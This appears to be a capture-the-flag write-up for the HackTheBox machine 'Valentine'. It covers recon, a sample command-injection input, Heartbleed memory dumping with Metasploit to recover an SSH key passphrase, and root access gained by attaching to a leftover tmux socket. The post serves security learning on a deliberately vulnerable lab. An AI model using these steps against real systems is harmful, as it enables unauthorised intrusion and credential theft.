---
layout: post
name: valentine
title: "HackTheBox: Valentine"
date: 2022-05-17 10:00:00 +1000
categories: red-team
tags: linux feroxbuster openssl heartbleed tmux
summary: A history of bad security practices.
excerpt_separator: <!--more-->
---

**Valentine** is a Linux-based machine authored by *mrb3n*, with an average rating of 4.4 stars.

<!--more-->

<p align="center"><img src="/assets/images/valentine/main.png" /></p>

### // Lessons Learned
1. subsequent nmap scans that target specific services / protcols (e.g ssl) can sometimes be required to identify vulnerabilities
2. shell history files are always worth checking

### // Recon
```
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ nmap -A -p- valentine.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 10:46 AEST
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2022-05-17T00:48:11+00:00; +1m42s from scanner time.
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: Host: 10.10.10.136; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1m41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds
```

Nmap reveals this machine is running:
- OpenSSH on port `22`
- Apache http on port `80` and https on `443`

Accessing the HTTP site via browser reveals a single-image homepage:

![](/assets/images/valentine/1.png)

Accessing the HTTPS version returns the same content, with a self-signed certificate. There's no links on either site, but putting [feroxbuster](https://github.com/epi052/feroxbuster) to work with a [SecLists](https://github.com/danielmiessler/SecLists) wordlist quickly provides us some additional content:
```
$ feroxbuster -u http://valentine.htb -w ~/VMWare-shared/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://valentine.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301        9l       28w      312c http://valentine.htb/dev
200        1l        2w       38c http://valentine.htb/index
200        8l       39w      227c http://valentine.htb/dev/notes
403       10l       30w      294c http://valentine.htb/server-status
200       27l       54w      554c http://valentine.htb/encode
[####################] - 25s    59998/59998   0s      found:5       errors:0
[####################] - 24s    29999/29999   1227/s  http://valentine.htb
[####################] - 24s    29999/29999   1226/s  http://valentine.htb/dev
```

Similar results are returned when scanning HTTPS, so it's probably safe to assume there is only one site. `http://valentine.htb/dev` returns a brief directory listing:

![](/assets/images/valentine/2.png)

`hype_key` contains what looks like hex-encoded data:
```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62
...
```

Running this through an online [hex decoder](https://cryptii.com/pipes/hex-decoder) reveals that it is actually an RSA-encrypted private key, the kind that might be used to authenticate to an ssh service without a password, provided the corresponding username is known:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
...
-----END RSA PRIVATE KEY-----
```

The `notes.txt` file reveals a typical developer to-do:
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

`http://valentine.htb/encode`, and the linked `http://valentine.htb/decode.php` pages both provide a simple form, that seems to offer complimentary 'Secure Data' services. Entering a value of `123` into the `/encode` form returns:
```
Your input:
123
Your encoded input:
MTIz
```

while entering `MTIz` into the `/decode.php` form returns:
```
Your input:
MTIz
Your encoded input:
123
```

We can easily confirm offline that the encoding scheme in use is `base64`:
```
$ echo 123 | base64 && echo MTIz | base64 -d
MTIzCg==
123
```

Since the server seems to be handling the transformation of our input on these two forms, it's worth considering how this might be implemented. PHP includes `base64_encode()` and `base64_decode()` functions, which if used don't inherently present a security risk. But it's also possible that the code implements this functionality in a more insecure manner, by running code on the server using a function such as `system()` or `exec()`. If this is the case, it may be possible to exploit the server via a technique known as [command injection](https://www.stackhawk.com/blog/php-command-injection/), whereby the context of the code is escaped in a way that allows for arbitrary command execution. For example, assuming the server-side encoding function was implemented as:

```
system("echo ".$_GET['text']." | base64");
```

then an input such as `123 && whoami");//` would manipulate the context, and result in the server running:
```
echo 123 && whoami
```

which would output the string `123` and the result of the `whoami` command. This is a simplified example, and there can often be server-side filtering in place to prevent this that needs to be bypassed (for which there are many [known](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) [techniques](https://blog.0xffff.info/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/)). Unfortunately extensive testing of both forms, it appears that neither is vulnerable to command injection, meaning they are likely implemented without using a code execution function.

The `.php` suffix in the decode url provides a good indication of the server language, and checking the HTTP response headers indicates that a fairly old version of PHP is in use:
```
...
X-Powered-By: PHP/5.3.10-1ubuntu3.26
...
```

[Searchsploit](https://www.exploit-db.com/searchsploit) reveals a [remote code execution vulnerability](https://www.exploit-db.com/exploits/29290) for the versions of Apache & PHP in use on the target, that takes advantage of an insecure cgi-bin setup. The exploit requires access to either `/cgi-bin/php5` or `/cgi-bin/php`, the default install locations, but despite `http://valentine.htb/cgi-bin` apparently being present on the server (returns a `403`) the actual binary itself can't be found. Extensive brute-forcing with Feroxbuster and various wordlists fails to turn up anything within this directory, so it's possible that the cgi-bin module is not present on the target.

### // Initial Foothold

Zooming back out again, it's worth taking a closer look at the HTTPS service running. Despite it appearing to serve identical content to HTTP, the implementation of it may present an opportunity for attack, specifically the OpenSSL implementation used. In 2014, the [Heartbleed](https://www.vox.com/2014/6/19/18076318/heartbleed) vulnerability was released, providing a means to exploit insecure versions of OpenSSL. By sending specially crafted heartbeat requests to the server (a legitimate part of the SSL standard) it was found to be possible to induce the server to dump the contents of its memory, which can often reveal useful information. A [metasploit module](https://www.rapid7.com/blog/post/2014/04/09/metasploits-heartbleed-scanner-module-cve-2014-0160/) has been published, which can easily confirm if a server is vulnerable:
```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS            valentine.htb    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability


msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[*] valentine.htb:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

With the vulnerability confirmed, we can modify the `action` parameter to `DUMP`, which will dump whatever memory the server leaks to a local file:
```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
action => DUMP
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[+] 10.10.10.79:443       - Heartbeat data stored in /home/kali/.msf4/loot/20220518104742_default_10.10.10.79_openssl.heartble_939265.bin
[*] valentine.htb:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The `.bin` file generated isn't readable, but running it through the `strings` utility returns any content that is readable, which we can do without exiting metasploit:
```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > strings /home/kali/.msf4/loot/20220518104742_default_10.10.10.79_openssl.heartble_939265.bin
[*] exec: strings /home/kali/.msf4/loot/20220518104742_default_10.10.10.79_openssl.heartble_939265.bin

ux i686; rv:45.0) Gecko/20100101 Firefox/45.0
Referer: https://127.0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
QvLvG
nagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>L_(C
ywm8
w!e-
%t:1A
!}wu
...
```

There is a lot of garbage output here, but thing that sticks out immediately is the line `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`. This is likely base64-encoded content (indicated by the `==` padding characters on the end), and decoding it reveals:
```
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

Turning this into something actionable at this point requires a bit of guesswork, but essentially we now have an ssh file `hype_key`, and a string `heartbleedbelievethehype`. If we try to ssh onto the box as the user `hype` (guessed from the name of the key file) and supply `heartbleedbelievethehype` as the passphrase for the key file, we're now able to log in:
```
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ ssh hype@valentine.htb -i id_rsa   
Enter passphrase for key 'id_rsa': <enter heartbleedbelievethehype here>
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue May 17 17:20:38 2022 from 10.10.17.230
hype@Valentine:~$
```

From here, we can retrieve the user flag from the usual location:
```
hype@Valentine:~$ cd Desktop
hype@Valentine:~/Desktop$ cat user.txt
e6710***************************
```

### // Privilege Escalation

Before using any form of privilege escalation tool such as [linPEAs](https://github.com/carlospolop/PEASS-ng) or [LinEnum](https://github.com/rebootuser/LinEnum), I prefer to manually take a look around a server first, looking for things that are out of place, unusual or interesting (or all three). Within the `hype` user's home directory there is a `.bash_history` file, which on a lot of machines is a symlink to `/dev/null`, indicating history recording is disabled. In this case it isn't, and the contents are pretty interesting:

```
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

It looks like our user has been making use of [tmux](https://github.com/tmux/tmux/wiki), a *terminal multiplexer*, and working within a hidden `/.devs` folder. The folder only contains a single file, `dev_sess`, which we can see the user has been trying to interact with. Checking the tmux manual page (or making use of [explainshell.com](https://explainshell.com/)) confirms that the final command run, `tmux -S /.devs/dev_sess`, was to enter into tmux and specify a *socket-path*, in this case the file `/.devs/dev_sess`. If we run the command ourself:
```
hype@Valentine:/.devs$ tmux -S /.devs/dev_sess
root@Valentine:/.devs#
```

we are immediately dropped into a session logged in as `root`. While this may seem like an unlikely exploit, it is not uncommon for developers to leave sessions running in detached mode on a machine, either to provide shared access to a privileged account or more commonly to execute long-running scripts (another common utility used for this is `screen`.) Once attached to the session, we can retrieve the root flag from the usual location:
```
root@Valentine:/.devs# cat ~/root.txt
f1bb6***************************
```

![](/assets/images/valentine/3.png)
